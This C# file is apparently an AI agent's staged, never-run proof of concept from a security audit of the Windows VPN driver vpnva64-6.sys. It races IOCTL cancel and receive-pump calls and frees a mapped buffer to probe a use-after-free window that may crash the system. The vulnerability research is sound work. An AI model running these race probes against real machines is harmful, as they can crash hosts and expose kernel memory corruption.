// t5_phaseB.cs - DESTRUCTIVE PHASE-B PoC (STAGED by agent t5; NEVER EXECUTED by agent t5).
// Orchestrator-gated solo phase ONLY, per the memory-write directive + dynamic protocol.
//
// Static basis (vpnva.md section 5.1): IOCTL 0x22200A maps the caller MDL into system VA
// (MmMapLockedPagesSpecifyCache), the IRP is parked at ctx+0x48, and the receive-pump timer
// (ctx+0xD0, triggered via METHOD_NEITHER 0x222027) drains user-owned bytes into
// NdisMIndicateReceiveNetBufferLists. Section 5.1 explicitly documents the lifetime hole:
// "Cancel path FUN_1400038c0 -> FUN_14003320 tears down, but the parked IRP + stale mapping
// lifetimes are the usual race window." This ladder aims at exactly that window.
//
// PREREQUISITE (B0 gate): a working miniport instantiation. Phase A could NOT instantiate
// the miniport in the test VM (NdisMAddDevice -> STATUS_UNSUCCESSFUL) - see
// audits/vpnva.dynamic.md. If the gate fails, the ladder aborts.
//
// Steps - ONE vmrun runProgramInGuest invocation PER STEP; pull evidence immediately:
//   B0 (safe):  device present + open RW + 0x22201C query + 0x222004 {8,8} config.
//               Any failure -> abort "miniport not instantiated".
//   B1 (race):  x5 cycles: park 0x22200A (fresh 0x8000 B ring) -> 0x222027 pump ->
//               CancelIoEx IMMEDIATELY (<10 ms) -> reap. Maximizes the cancel/pump race;
//               stale-VA read may bugcheck with vpnva64-6.sys in the stack.
//   B2 (stale): park 0x22200A -> 0x222027 pump -> unpin ring + drop ref + GC.Collect +
//               GC.WaitForPendingFinalizers + allocate 64 MB pressure (force page reuse)
//               -> 0x222027 pump again -> wait 5 s -> cancel -> reap.
//               Probes whether the driver keeps using the VA after the MDL/park lifetime.
//   B3 (soak):  30 rapid park/pump/cancel cycles (only if B1/B2 were survivable).
// Every log line is flushed BEFORE the call it describes, so pre-call evidence survives a
// guest death inside the call. After any step: no reboot/power ops (orchestrator-only).
// usage: t5_phaseB.exe <logfile> <cmd>
//   b0 | b1 | b2 | b3
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

public class T5PhaseB
{
    static string Log;

    static void L(string s)
    {
        Console.WriteLine(s);
        try { if (Log != null) File.AppendAllText(Log, s + "\r\n"); } catch { }
    }

    static int Main(string[] args)
    {
        if (args.Length < 2) { Console.WriteLine("usage: t5_phaseB.exe <logfile> <cmd>"); return 2; }
        Log = args[0];
        try
        {
            switch (args[1])
            {
                case "b0": return B0();
                case "b1": return B1();
                case "b2": return B2();
                case "b3": return B3();
                default: L("unknown cmd"); return 2;
            }
        }
        catch (Exception e) { L("FATAL " + e.GetType().Name + ": " + e.Message); return 99; }
    }

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern IntPtr CreateFileW(string name, uint desiredAccess, uint shareMode, IntPtr secAttr, uint creationDisposition, uint flags, IntPtr tmpl);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool DeviceIoControl(IntPtr h, uint code, IntPtr inBuf, uint inLen, IntPtr outBuf, uint outLen, IntPtr bytesReturned, IntPtr overlapped);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern IntPtr CreateEventW(IntPtr attrs, bool manualReset, bool initialState, string name);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint WaitForSingleObject(IntPtr h, int ms);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool GetOverlappedResult(IntPtr h, IntPtr ov, out uint bytes, bool wait);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CancelIoEx(IntPtr h, IntPtr overlapped);

    [StructLayout(LayoutKind.Sequential)]
    struct OVERLAPPED { public IntPtr Internal; public IntPtr InternalHigh; public uint Offset; public uint OffsetHigh; public IntPtr hEvent; }

    static IntPtr INVALID = (IntPtr)(-1);
    const string DEV = "\\\\.\\VPNVA";

    static IntPtr OpenDev()
    {
        return CreateFileW(DEV, 0xC0000000, 0, IntPtr.Zero, 3, 0x40000000, IntPtr.Zero);
    }

    static byte[] NewRing()
    {
        byte[] ring = new byte[0x8000];
        for (int i = 0; i < ring.Length; i++) ring[i] = (byte)(0x5A ^ (i & 0xFF));
        return ring;
    }

    static bool Pump(IntPtr h)
    {
        GCHandle ovP = GCHandle.Alloc(new OVERLAPPED { hEvent = CreateEventW(IntPtr.Zero, true, false, null) }, GCHandleType.Pinned);
        bool ok = DeviceIoControl(h, 0x222027, IntPtr.Zero, 0, IntPtr.Zero, 0, IntPtr.Zero, ovP.AddrOfPinnedObject());
        int err = Marshal.GetLastWin32Error();
        if (!ok && err == 997)
        {
            uint b; WaitForSingleObject(ovP.AddrOfPinnedObject() == IntPtr.Zero ? IntPtr.Zero : GetEv(ovP), 3000);
            GetOverlappedResult(h, ovP.AddrOfPinnedObject(), out b, false);
            ok = true;
        }
        ovP.Free();
        return ok;
    }

    static IntPtr GetEv(GCHandle ovP)
    {
        OVERLAPPED ov = (OVERLAPPED)ovP.Target;
        return ov.hEvent;
    }

    // -------- B0: safety gate --------
    static int B0()
    {
        L("=== B0 gate ===");
        L("  >>> pre-call marker " + DateTime.UtcNow.ToString("o"));
        IntPtr h = OpenDev();
        int err = Marshal.GetLastWin32Error();
        if (h == INVALID) { L(String.Format("OPEN FAIL lastErr={0} -> ABORT (miniport not instantiated or DACL denies)", err)); return 2; }
        L(String.Format("open OK handle=0x{0:X}", h.ToInt64()));
        GCHandle ovP = GCHandle.Alloc(new OVERLAPPED { hEvent = CreateEventW(IntPtr.Zero, true, false, null) }, GCHandleType.Pinned);
        byte[] out18 = new byte[0x18];
        GCHandle op = GCHandle.Alloc(out18, GCHandleType.Pinned);
        bool ok = DeviceIoControl(h, 0x22201C, IntPtr.Zero, 0, op.AddrOfPinnedObject(), 0x18, IntPtr.Zero, ovP.AddrOfPinnedObject());
        err = Marshal.GetLastWin32Error();
        L(String.Format("0x22201C ok={0} err={1}", ok, err));
        if (!ok) { L("ABORT: state query failed"); return 3; }
        byte[] cfg = new byte[] { 8, 0, 0, 0, 8, 0, 0, 0 };
        GCHandle cp = GCHandle.Alloc(cfg, GCHandleType.Pinned);
        ok = DeviceIoControl(h, 0x222004, cp.AddrOfPinnedObject(), 8, IntPtr.Zero, 0, IntPtr.Zero, ovP.AddrOfPinnedObject());
        err = Marshal.GetLastWin32Error();
        L(String.Format("0x222004 {{8,8}} ok={0} err={1}", ok, err));
        CloseHandle(h);
        L("B0 PASS");
        return 0;
    }

    // one park+pump+cancel cycle; returns final NTSTATUS
    static uint RaceCycle(int idx, bool immediateCancel)
    {
        L(String.Format("--- race cycle {0} ---", idx));
        IntPtr h = OpenDev();
        if (h == INVALID) { L("open FAIL -> abort cycle"); return 0xFFFFFFFF; }
        byte[] ring = NewRing();
        GCHandle rp = GCHandle.Alloc(ring, GCHandleType.Pinned);
        OVERLAPPED ov = new OVERLAPPED { hEvent = CreateEventW(IntPtr.Zero, true, false, null) };
        GCHandle ovP = GCHandle.Alloc(ov, GCHandleType.Pinned);
        L(String.Format("cycle {0}: >>> pre-0x22200A marker {1}", idx, DateTime.UtcNow.ToString("o")));
        bool ok = DeviceIoControl(h, 0x22200A, IntPtr.Zero, 0, rp.AddrOfPinnedObject(), (uint)ring.Length, IntPtr.Zero, ovP.AddrOfPinnedObject());
        int err = Marshal.GetLastWin32Error();
        L(String.Format("cycle {0}: 0x22200A ok={1} err={2} (997=parked)", idx, ok, err));
        if (!ok && err == 997)
        {
            L(String.Format("cycle {0}: parked -> pump 0x222027 {1}", idx, immediateCancel ? "then IMMEDIATE cancel" : "then wait"));
            Pump(h);
            L(String.Format("cycle {0}: pump issued -> CancelIoEx now", idx));
            bool c = CancelIoEx(h, ovP.AddrOfPinnedObject());
            L(String.Format("cycle {0}: CancelIoEx -> {1} lastErr={2}", idx, c, Marshal.GetLastWin32Error()));
            uint b = 0;
            if (WaitForSingleObject(ov.hEvent, 10000) == 0)
            {
                GetOverlappedResult(h, ovP.AddrOfPinnedObject(), out b, false);
                uint st = (uint)Marshal.ReadInt32(ovP.AddrOfPinnedObject());
                L(String.Format("cycle {0}: parked IRP resolved NTSTATUS=0x{1:X8} bytes={2}", idx, st, b));
                ovP.Free(); CloseHandle(ov.hEvent); rp.Free(); CloseHandle(h);
                return st;
            }
            L(String.Format("cycle {0}: parked IRP STILL PENDING after cancel (10 s)", idx));
            ovP.Free(); CloseHandle(ov.hEvent); rp.Free(); CloseHandle(h);
            return 0xFFFFFFFE;
        }
        L(String.Format("cycle {0}: no park (ok={1} err={2}) - state changed?", idx, ok, err));
        ovP.Free(); CloseHandle(ov.hEvent); rp.Free(); CloseHandle(h);
        return (uint)err;
    }

    static int B1()
    {
        L("=== B1 cancel/pump race x5 ===");
        for (int i = 1; i <= 5; i++)
        {
            L("  >>> pre-cycle marker " + DateTime.UtcNow.ToString("o"));
            uint st = RaceCycle(i, true);
            if (st == 0xFFFFFFFF) return 2;
        }
        L("B1 DONE (survived)");
        return 0;
    }

    static int B3()
    {
        L("=== B3 soak x30 ===");
        for (int i = 1; i <= 30; i++)
        {
            L("  >>> pre-cycle marker " + DateTime.UtcNow.ToString("o"));
            uint st = RaceCycle(i, true);
            if (st == 0xFFFFFFFF) return 2;
        }
        L("B3 DONE (survived)");
        return 0;
    }

    static int B2()
    {
        L("=== B2 free-while-mapped ===");
        IntPtr h = OpenDev();
        if (h == INVALID) { L("open FAIL -> abort"); return 2; }
        byte[] ring = NewRing();
        GCHandle rp = GCHandle.Alloc(ring, GCHandleType.Pinned);
        OVERLAPPED ov = new OVERLAPPED { hEvent = CreateEventW(IntPtr.Zero, true, false, null) };
        GCHandle ovP = GCHandle.Alloc(ov, GCHandleType.Pinned);
        L("  >>> pre-0x22200A marker " + DateTime.UtcNow.ToString("o"));
        bool ok = DeviceIoControl(h, 0x22200A, IntPtr.Zero, 0, rp.AddrOfPinnedObject(), (uint)ring.Length, IntPtr.Zero, ovP.AddrOfPinnedObject());
        int err = Marshal.GetLastWin32Error();
        L(String.Format("0x22200A ok={0} err={1}", ok, err));
        if (!(ok == false && err == 997)) { L("  not parked -> abort B2"); return 3; }
        L("  parked -> pump 1");
        Pump(h);
        L("  >>> pre-free marker " + DateTime.UtcNow.ToString("o"));
        rp.Free();           // unpin
        ring = null;         // drop ref (array becomes collectable; MDL holds the pages unless driver unlocked early)
        GC.Collect();
        GC.WaitForPendingFinalizers();
        byte[][] pressure = new byte[8][];
        for (int i = 0; i < 8; i++) { pressure[i] = new byte[0x800000]; for (int j = 0; j < pressure[i].Length; j += 4096) pressure[i][j] = 0x41; }
        L("  heap pressure applied (64 MB) -> pump 2 against possibly-reused pages");
        Pump(h);
        uint b;
        if (WaitForSingleObject(ov.hEvent, 5000) == 0)
        {
            GetOverlappedResult(h, ovP.AddrOfPinnedObject(), out b, false);
            uint st = (uint)Marshal.ReadInt32(ovP.AddrOfPinnedObject());
            L(String.Format("  parked IRP resolved NTSTATUS=0x{0:X8} bytes={1}", st, b));
        }
        else
        {
            L("  still parked -> CancelIoEx");
            CancelIoEx(h, ovP.AddrOfPinnedObject());
            if (WaitForSingleObject(ov.hEvent, 10000) == 0)
            {
                GetOverlappedResult(h, ovP.AddrOfPinnedObject(), out b, false);
                uint st = (uint)Marshal.ReadInt32(ovP.AddrOfPinnedObject());
                L(String.Format("  resolved after cancel NTSTATUS=0x{0:X8} bytes={1}", st, b));
            }
            else L("  STILL PENDING after cancel");
        }
        pressure = null;
        GC.Collect();
        CloseHandle(h);
        L("B2 DONE (survived)");
        return 0;
    }
}
